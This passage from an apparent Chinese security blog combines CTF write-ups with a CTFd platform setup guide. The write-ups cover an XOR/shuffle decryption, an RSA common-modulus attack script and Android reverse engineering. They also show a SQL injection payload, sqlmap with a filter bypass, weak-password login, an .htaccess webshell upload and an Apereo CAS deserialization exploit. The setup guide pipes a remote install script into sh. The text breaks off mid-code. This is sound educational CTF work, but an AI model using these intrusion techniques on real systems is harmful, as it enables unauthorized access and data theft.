<p>伪随机+shuffle生成s盒进行的置换异或加密</p>
<p>根据<code>key=&quot;x.x.x.x&quot;</code>可知key就是ip地址，为<code>192.168.3.201</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> random<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_flag</span>(<span class="hljs-params">encrypted_flag, key</span>):<br>   random.seed(key)<br>   table = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">38</span>))<br>   random.shuffle(table)<br>   <span class="hljs-comment"># 解码base64编码的字符串</span><br>   encrypted_flag = base64.b64decode(encrypted_flag.encode(<span class="hljs-string">&quot;ascii&quot;</span>))<br><br>   <span class="hljs-comment"># 随机生成一个密钥</span><br>   random.seed(key)<br>   xor_key = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br><br>   <span class="hljs-comment"># 对加密后的ASCII码列表进行异或运算</span><br>   decrypted_flag = [c ^ xor_key <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> encrypted_flag]<br><br>   <span class="hljs-comment"># 将异或后的ASCII码列表转换成字符列表</span><br>   flag = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> decrypted_flag])<br>   final_flag = [<span class="hljs-number">0</span>]*<span class="hljs-number">38</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(table)):<br>       final_flag[table[i]] = flag[i]<br><br>   <span class="hljs-comment"># 返回解密后的flag字符串</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(final_flag)<br><br>key = <span class="hljs-string">&quot;192.168.3.201&quot;</span><br>text = <span class="hljs-string">&#x27;VFVWU1kGBgIMUlMBVFcBBgRRBFAHVFBVUFkbUB0DAQMEBVIGAlE=&#x27;</span><br>flag = decrypt_flag(text, key)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>宁波</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf平台搭建与出题指南</title>
    <url>/%E7%AB%9E%E8%B5%9B/ctf%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97.html</url>
    <content><![CDATA[<h1 id="ctf平台搭建"><a href="#ctf平台搭建" class="headerlink" title="ctf平台搭建"></a>ctf平台搭建</h1><p>平台选择的是目前使用最广泛的<a href="https://github.com/CTFd/CTFd">CTFd</a>，二开也很方便，相关插件也很多</p>
<p>以下两种安装方法都使用了<code>glzjin</code>的<a href="https://github.com/glzjin/CTFd-Whale">CTFd-Whale</a>插件，以支持动态靶机</p>
<h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><p>使用帆哥的<a href="https://github.com/pwnthebox/ctfd-auto-deploy">一键部署脚本</a>（centos7和ubuntu20上测试成功）<br><code>sh &lt;(curl -s https://raw.githubusercontent.com/pwnthebox/ctfd-auto-deploy/master/install.sh)</code></p>
<p>注意点：中间需要手动输入三个值<br>分别是<br><code>Http Domain Suffix</code> ：<code>域名/ip</code><br><code>External Http Port</code> : <code>靶机http映射端口</code> (这里不能写80，因为80给了nginx，当然也可以自己改下脚本，不使用nginx代理)<br><code>Direct Minimum/Maximum Port</code> : <code>靶机端口开放范围</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/ctf%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%E5%92%8C%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97-ctfd-1.png"></p>
<blockquote>
<p>注：用这个脚本的时候最好挂代理，不然可能跑一天。如果脚本成功运行完毕，那么平台上就无需再次配置，很方便</p>
</blockquote>
<h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>使用鲸喵师傅打包好的ctfd和whale插件<br>先准备好<code>docker</code>环境和<code>docker-compose</code></p>
<p>创建swarm集群<br><code>docker swarm init</code></p>
<p>加入集群<br><code>docker node update --label-add=&#39;name=linux-1&#39; $(docker node ls -q)</code></p>
<p>拉取镜像<br><code>git clone https://github.com/VaalaCat/CTFd.git --depth=1</code><br><code>git clone https://github.com/VaalaCat/ctfd-whale.git</code></p>
<p>修改token<br>两个文件的token值修改成一样的，如果用到了域名记得修改<code>subdomain_host</code><br><code>vim CTFd/conf/frp/frps.ini</code><br><code>vim CTFd/conf/frp/frpc.ini</code></p>
<p>安装插件（在CTFd目录下运行）<br><code>git submodule update --init</code></p>
<p>启动（在CTFd目录下运行）<br><code>docker-compose up -d</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/ctf%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%E5%92%8C%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97-ctfd-2.png"></p>
<p>访问<a href="http://xx.xx.xx.xx:9124/">http://xx.xx.xx.xx:9124</a> (默认是9124，想要80可以修改docker-compose.yml)</p>
<p><strong>平台配置</strong><br>右上角的插件中进入 Whale 设置，其中，左侧 Docker&#x2F;Limits&#x2F;Challenges 菜单栏根据需求自行更改， Frp 菜单栏中的内容需要更改一下几个选项</p>
<p><code>Http Domain Suffix</code>	node.lewiserii.top 这里填写使用http方式访问靶机的泛解析域名<br><code>Http Port</code>	8080 这里填写frps中的vhost_http_port，该端口为http方式靶机访问的端口<br><code>Direct IP Address</code>	xxx.xxx.xxx.xxx 这里填写服务器ip，用于显示Direct方式访问的题目的IP<br><code>Direct Minimum Port</code>	9000 这里填写用于动态靶机Direct方式的开始端口<br><code>Direct Maximum Port</code>	9200 这里填写结束端口</p>
<p>优点：非常稳定，基本都能一次成功</p>
<h1 id="动态flag题目部署"><a href="#动态flag题目部署" class="headerlink" title="动态flag题目部署"></a>动态flag题目部署</h1><p>模板项目地址：<a href="https://github.com/lewiserii/CTFd_Template">https://github.com/lewiserii/CTFd_Template</a></p>
<p>包含pwn系列的ubuntu16，ubuntu18，ubuntu20，ubuntu22<br>web系列的php，java，python，go，mysql<br>misc，reverse系列的部分动态</p>
<p>因为不会crypto，就没写交互的crypto</p>
<h2 id="pwn题部署"><a href="#pwn题部署" class="headerlink" title="pwn题部署"></a>pwn题部署</h2><p>假设现在出了一道pwn题，名字是baby_stack</p>
<p>首先根据题目选择需要的Ubuntu版本，这里以Ubuntu16为例，下载<code>pwn_ubuntu16</code>这个模板</p>
<p>把出好的二进制文件放到bin目录下，替换<code>test</code><br>然后找到<code>ctf.xinetd</code>文件中的<code>server_args</code>值，修改<code>test</code>为附件名</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/ctfd-template-1.png"></p>
<p><strong>第二步</strong>，构建镜像<br>在<code>Dockerfile</code>所在的目录运行<code>docker build -t &lt;镜像名&gt; .</code><br>运行后可以用<code>docker images</code>查看下是否成功生成了镜像</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/ctfd-template-2.png"></p>
<p><strong>第三步</strong>，本地测试或CTFd部署</p>
<blockquote>
<p>本地测试这步可选，没有信心一次成功的话可以先在本地测试下</p>
</blockquote>
<p>运行<code>docker run -itd -p &lt;对外暴露端口&gt;:9999 &lt;镜像名&gt; /start.sh</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/ctfd-template-3.png"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/ctfd-template-4.png"></p>
<p>nc连接后能返回程序的功能就ok了(别忘记删除容器)<br>接着在CTFd上部署，注意type选择direct，image与port对应即可</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/ctfd-template-5.png"></p>
<h2 id="misc题部署"><a href="#misc题部署" class="headerlink" title="misc题部署"></a>misc题部署</h2><blockquote>
<p>通常有两种方式，一种是利用python启动一个web服务，另一种是利用nginx或httpd</p>
</blockquote>
<blockquote>
<p>个人认为动态misc的核心思路就是把出题过程转换为一个脚本，然后读取平台传递的flag后生成附件，利用web服务下载。所以部分工具题和复杂一点的题目是没有办法出动态的</p>
</blockquote>
<p>还是先根据需求选择不同的环境，这里以<code>misc_python3.9-httpd</code>为例</p>
<p><strong>第一步</strong>，先将出题思路写进一个脚本中，命名为<code>challenges.py</code>，所需的模块放到<code>requirements.txt</code>中</p>
<p>这个脚本有几点需要注意：<br>1：需要从<code>/flag</code>读取flag值<br>2：出题后生成的附件需要套一层压缩包以便访问自动下载，zip需要命名为<code>attachment.zip</code><br>3：尽量在脚本结束时删除无用的文件</p>
<p>以下是一个简单的例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> pyminizip<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image,ImageDraw,ImageOps<br><br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>flag=f.read()<br><br>a=Image.new(<span class="hljs-string">&quot;1&quot;</span>,(<span class="hljs-number">300</span>,<span class="hljs-number">20</span>))<br>w,h=a.size<br>d=ImageDraw.Draw(a)<br>d.text((<span class="hljs-number">0</span>,<span class="hljs-number">0</span>),flag,fill=<span class="hljs-number">255</span>)<br>a = ImageOps.invert(a)<br>a.save(<span class="hljs-string">&#x27;1.png&#x27;</span>)<br><br><br>password = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choices(<span class="hljs-string">&#x27;0123456789&#x27;</span>, k=<span class="hljs-number">8</span>))<br>pyminizip.compress(<span class="hljs-string">&quot;1.png&quot;</span>, <span class="hljs-literal">None</span>, <span class="hljs-string">&quot;attachment.zip&quot;</span>, password, <span class="hljs-number">5</span>)<br>os.remove(<span class="hljs-string">&quot;1.png&quot;</span>)<br></code></pre></td></tr></table></figure>


<p><strong>第二步</strong>，将代码放进<code>files</code>目录，然后生成镜像</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/ctfd-template-6.png"></p>
<p><strong>第三步</strong>，在CTFd上部署，然后验证</p>
<p>部署时端口选择80</p>
<p>开启靶机后访问，如果没出问题的话应该只会弹出一个保存文件的窗口，且能成功下载</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/ctfd-template-7.png"></p>
<p>下载到本地后就可以正常解题</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一定要灵活使用dockerfile，不同题目根据<strong>需求</strong>做不同策略</p>
]]></content>
      <categories>
        <category>ctfd</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>出题</tag>
        <tag>ctfd</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>第二届vecctf-wp</title>
    <url>/%E7%AB%9E%E8%B5%9B/%E7%AC%AC%E4%BA%8C%E5%B1%8Avecctf-wp.html</url>
    <content><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="zip-guessing"><a href="#zip-guessing" class="headerlink" title="zip-guessing"></a>zip-guessing</h2><p>打开压缩包发现提示<code>password=.......py</code></p>
<p>进行6位密码爆破，得到密码<code>3a1b6c</code></p>
<p>解压得到flag</p>
<blockquote>
<p>flag{fa8d910600a5467d9d2f433f2bba4c80}</p>
</blockquote>
<h2 id="Spiderman"><a href="#Spiderman" class="headerlink" title="Spiderman"></a>Spiderman</h2><p>修改高度，发现字符串<code>README：HAHAyoufoundIT</code></p>
<p>binwalk分离出一个带密码的压缩包</p>
<p>压缩包中含有一个名为<code>README.txt</code>的文件<br>将<code>HAHAyoufoundIT</code>写入<code>README.txt</code>并压缩成zip文件后发现两个<code>README.txt</code>的crc一致</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/vec2-Spiderman-1.png"></p>
<p>采用明文爆破出密码<code>!g^c*0</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/vec2-Spiderman-2.png"></p>
<p>解压后得到一张png</p>
<p><code>stegsolve</code>分析图片，发现<code>0</code>通道中藏有flag</p>
<blockquote>
<p>flag{Z1p_1maGE_lSB_1nterestiNG}</p>
</blockquote>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="baby-rsa"><a href="#baby-rsa" class="headerlink" title="baby rsa"></a>baby rsa</h2><p>因为两组数据的N相同，尝试共模攻击</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> gmpy2<br>n,e1 = (<span class="hljs-number">18278250860121129714191417969518671565676609370438974713591911937173608105906651505337301762681939894104610580889645217298111784819358890536088923234106589063389221021186473430580352803412280849862104635302801082728967968107748121682339447067731887326087497520544915737621714860811217331095698945949486830528216492874665673677441699322439459330337628648399309373351992766984612437555092804129107438390294123179182945321411199463748963590901018595492869891970965012682196059824464339830536600021131729277503225240822584625293463254992623570796895110736563514265569133338477447460712899749955523316083254492005199917987</span>, <span class="hljs-number">76831</span>)<br>c1 = <span class="hljs-number">14068017239200053057485191549313171235040341952680207740172042657952395329165768631549600187463451884623632792268314205814005668826033658861436424617991125160661381291003863394279707111450435808077534541510943745285958554921154542813613390731768463465972495263609910077893559813685204864361223917445770159726623708768996447642959844639282015350260298045019617026128700143368357847147111693153254268063490280666808714031170237337721534721243540077707555520501582047389390048200750092516532861791678414405037042484148584170396597267139826760931348123330503380212299827883145622326471261247290265669559897644089748984204</span><br>n,e2 = (<span class="hljs-number">18278250860121129714191417969518671565676609370438974713591911937173608105906651505337301762681939894104610580889645217298111784819358890536088923234106589063389221021186473430580352803412280849862104635302801082728967968107748121682339447067731887326087497520544915737621714860811217331095698945949486830528216492874665673677441699322439459330337628648399309373351992766984612437555092804129107438390294123179182945321411199463748963590901018595492869891970965012682196059824464339830536600021131729277503225240822584625293463254992623570796895110736563514265569133338477447460712899749955523316083254492005199917987</span>, <span class="hljs-number">65537</span>)<br>c2 = <span class="hljs-number">17120091052055468753592285548832983539343349280048150965811042901415659935929189229298761316319784219958366772027986939749507760509991462838561325114714990126772560070483939658678703332135866293838146121312972251030190756953273311362066029287803984179301942229948301600814847050270084193184210232673652417884727838290706970298245205101865234726242081382680212621541249662659284218079172180588507736208257188130972936994297239579885142233896240153633237886314935309710560434501987121687537279749951910677771351212584805615709915168729977338949858374823750316083595198620089092891606394712323216539675547753350603350269</span><br>s=gmpy2.gcdext(e1,e2)<br>s1=s[<span class="hljs-number">1</span>]<br>s2=s[<span class="hljs-number">2</span>]<br><span class="hljs-keyword">if</span> s1&lt;<span class="hljs-number">0</span>:<br>    s1=-s1<br>    c1=gmpy2.invert(c1,n)<br><span class="hljs-keyword">else</span>:<br>    s2=-s2<br>    c2=gmpy2.invert(c2,n)<br><br>c1=gmpy2.powmod(c1,s1,n)<br>c2=gmpy2.powmod(c2,s2,n)<br>c=(c1*c2)%n<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:]))<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/vec2-babyrsa-1.png"></p>
<blockquote>
<p>flag{423c35691377ea18d35b97b7b6f13590}</p>
</blockquote>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ezfilter"><a href="#ezfilter" class="headerlink" title="ezfilter"></a>ezfilter</h2><p>抓包，在密码处尝试sql注入，回显了mysql的报错</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/vec2-ezfilter-1.png"></p>
<p>fuzz后发现过滤了空格，可以用<code>/**/</code>代替空格</p>
<p>sqlmap跑一下得到flag<br><code>sqlmap -r 1.txt --batch --tamper &quot;space2comment.py&quot; --dump</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/vec2-ezfilter-2.png"></p>
<blockquote>
<p>flag{30b08224ed436c8c690ae623a89466f3}</p>
</blockquote>
<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>在源码中发现<code>hint: TUhnd2VEQjRiRzluYVc0dWNHaHc=</code></p>
<p>两层base64得到<code>0x0x0xlogin.php</code></p>
<p>通过弱口令爆破进入后台 <code>admin</code>,<code>admin123456</code></p>
<p>在项目管理处发现一个文件上传点</p>
<p>通过将文件名置空，报错得到上传路径<code>uploaded</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/vec2-upload-1.png"></p>
<p>fuzz后发现允许上传<code>.htaccess</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/vec2-upload-2.png"></p>
<p>再上传一个图片马即可</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/vec2-upload-3.png"></p>
<p>蚁剑连接得到flag</p>
<blockquote>
<p>flag{063a5bda0b5a2a5d7b700d989f73902b}</p>
</blockquote>
<h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><p>查看源码：<code>/index.php?source</code></p>
<p>关键代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;session_id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;SELECT * FROM secrets WHERE session_id = &#x27;&quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;session_id&#x27;</span>] . <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$query</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;SELECT * FROM secrets WHERE session_id = &#x27;&quot;</span> . <span class="hljs-title function_ invoke__">session_id</span>() . <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$query</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>where后面为<code>true</code>就行了</p>
<p>payload：<code>1&#39; or &#39;1&#39;=&#39;1</code></p>
<h2 id="EzCas"><a href="#EzCas" class="headerlink" title="EzCas"></a>EzCas</h2><p>Apereo Cas反序列化</p>
<p>题目不出网，公开的普通exp没有回显<br>在github上找到一个<a href="https://github.com/MrMeizhi/ysoserial-mangguogan">带回显的项目</a></p>
<p>生成payload<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/vec2-ezcas-1.png"></p>
<p>构造命令<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/vec2-ezcas-2.png"></p>
<h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h2><p>模拟器先安装一下，有个查询按钮</p>
<p>apk文件，使用jadx分析</p>
<p>先全局搜索找到<code>onClick</code>函数，查看<code>点击查询按钮</code>时执行的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OooO0O0</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">View</span>.OnClickListener &#123;<br><br>    <span class="hljs-comment">/* renamed from: OooO0o0  reason: collision with root package name */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-comment">/* synthetic */</span> EditText f1853OooO0o0;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OooO0O0</span><span class="hljs-params">(EditText editText)</span> &#123;<br>        <span class="hljs-built_in">this</span>.f1853OooO0o0 = editText;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            LoginActivity.<span class="hljs-built_in">this</span>.OooOo0o.OooO0Oo(<span class="hljs-built_in">this</span>.f1853OooO0o0.getText().toString());<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>发现调用了<code>LoginActivity.this.OooOo0o.OooO0Oo</code>，查看函数声明</p>
<p>发现存在数据库</p>
<p><code>getWritableDatabase</code>函数用来连接数据库<br><code>OooO0OO</code>函数用来获取数据库密码<br><code>this.f1221OooO0o</code>为<code>OooO0OO</code>的对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">OooO0O0</span><span class="hljs-params">(String t)</span> &#123;<br>    <span class="hljs-built_in">this</span>.OooO0oO = t;<br>    SQLiteDatabase.loadLibs(<span class="hljs-built_in">this</span>.f1222OooO0o0);<br>    <span class="hljs-built_in">this</span>.f1221OooO0o = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OooO0OO</span>(<span class="hljs-built_in">this</span>.f1222OooO0o0);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">OooO0OO2</span> <span class="hljs-operator">=</span> OooO0OO();<br>    <span class="hljs-built_in">this</span>.f1220OooO0Oo = OooO0OO2;<br>    <span class="hljs-built_in">this</span>.f1219OooO0OO = <span class="hljs-built_in">this</span>.f1221OooO0o.getWritableDatabase(OooO0OO2);<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">OooO0O0</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">g</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; g &lt; <span class="hljs-number">100</span>; g++) &#123;<br>        <span class="hljs-type">ContentValues</span> <span class="hljs-variable">values</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ContentValues</span>();<br>        values.put(<span class="hljs-string">&quot;flag&quot;</span>, OooO0O0.OooO00o(<span class="hljs-string">&quot;&quot;</span> + g));<br>        values.put(<span class="hljs-string">&quot;num&quot;</span>, Integer.valueOf(g));<br>        <span class="hljs-built_in">this</span>.f1219OooO0OO.insert(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-literal">null</span>, values);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">OooO0Oo</span><span class="hljs-params">(String i)</span> &#123;<br>    SQLiteDatabase.loadLibs(<span class="hljs-built_in">this</span>.f1222OooO0o0);<br>    <span class="hljs-built_in">this</span>.f1221OooO0o = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OooO0OO</span>(<span class="hljs-built_in">this</span>.f1222OooO0o0);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">OooO0OO2</span> <span class="hljs-operator">=</span> OooO0OO();<br>    <span class="hljs-built_in">this</span>.f1220OooO0Oo = OooO0OO2;<br>    <span class="hljs-built_in">this</span>.f1219OooO0OO = <span class="hljs-built_in">this</span>.f1221OooO0o.getWritableDatabase(OooO0OO2);<br>    <span class="hljs-type">Cursor</span> <span class="hljs-variable">cursor</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.f1219OooO0OO.rawQuery(<span class="hljs-string">&quot;select * from test where num = &#x27;&quot;</span> + i + <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-literal">null</span>);<br>    <span class="hljs-built_in">this</span>.OooO0oo = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (cursor == <span class="hljs-literal">null</span> || !cursor.moveToFirst()) &#123;<br>        Toast.makeText(<span class="hljs-built_in">this</span>.f1222OooO0o0, <span class="hljs-built_in">this</span>.OooO0oo, <span class="hljs-number">0</span>).show();<br>        cursor.close();<br>        <span class="hljs-built_in">this</span>.f1219OooO0OO.close();<br>    &#125;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-built_in">this</span>.OooO0oo += cursor.getString(cursor.getColumnIndex(<span class="hljs-string">&quot;flag&quot;</span>)) + <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125; <span class="hljs-keyword">while</span> (cursor.moveToNext());<br>    Toast.makeText(<span class="hljs-built_in">this</span>.f1222OooO0o0, <span class="hljs-built_in">this</span>.OooO0oo, <span class="hljs-number">0</span>).show();<br>    cursor.close();<br>    <span class="hljs-built_in">this</span>.f1219OooO0OO.close();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>通过<code>OooO0OO</code>类的声明获得数据库文件的名称<code>data.db</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OooO0OO</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SQLiteOpenHelper</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OooO0OO</span><span class="hljs-params">(Context context)</span> &#123;<br>        <span class="hljs-built_in">super</span>(context, <span class="hljs-string">&quot;data.db&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// net.sqlcipher.database.SQLiteOpenHelper</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(SQLiteDatabase sqLiteDatabase)</span> &#123;<br>        sqLiteDatabase.execSQL(<span class="hljs-string">&quot;create table test(flag text, num text)&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// net.sqlcipher.database.SQLiteOpenHelper</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onUpgrade</span><span class="hljs-params">(SQLiteDatabase sqLiteDatabase, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> i1)</span> &#123;<br>        onCreate(sqLiteDatabase);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>改apk的后缀名然后解压文件，找到<code>data.db</code>文件</p>
<p>使用<code>DB4S</code>打开db文件，发现需要密码</p>
<p>获取<code>OooO0OO</code>函数的代码，发现先对<code>this.OooO0oO</code>中储存的数据进行base64解密<br>然后将返回值作为参数执行<code>OooO00o.OooO00o</code>函数<br>并将<code>OooO00o.OooO00o</code>函数的返回值作为参数调用<code>OooO00o</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">OooO0OO</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> OooO00o(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(OooO00o.OooO00o(Base64.decode(<span class="hljs-built_in">this</span>.OooO0oO, <span class="hljs-number">0</span>))));<br>&#125;<br></code></pre></td></tr></table></figure>


<p>对<code>this.OooO0oO</code>查找用例，找到获取资源的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">Oooo0o0</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> getSharedPreferences(<span class="hljs-string">&quot;secret&quot;</span>, <span class="hljs-number">0</span>).getString(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-literal">null</span>);<br>    Log.i(<span class="hljs-string">&quot;secret&quot;</span>, <span class="hljs-string">&quot;读取信息&quot;</span>);<br>    Log.i(<span class="hljs-string">&quot;secret&quot;</span>, <span class="hljs-string">&quot;flag:&quot;</span> + flag);<br>    <span class="hljs-keyword">return</span> flag;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>搜索资源<code>secret</code>，获取到加密后的密码<code>mkrPETW43g1796lzN2dtiC5qgsC+ybJIWHR8GEzhsI4=</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/vec2-findme-1.png"></p>
<p>查看<code>OooO00o.OooO00o</code>函数的代码，发现是aes解密，密钥通过<code>OooO0O0</code>函数获取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OooO00o</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] OooO00o(<span class="hljs-type">byte</span>[] plainText) &#123;<br>        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">secretKey</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(OooO0O0(<span class="hljs-string">&quot;xGP_UACWNcWO]WNP&quot;</span>.getBytes(), <span class="hljs-string">&quot;123456&quot;</span>.getBytes()), <span class="hljs-string">&quot;AES&quot;</span>);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span 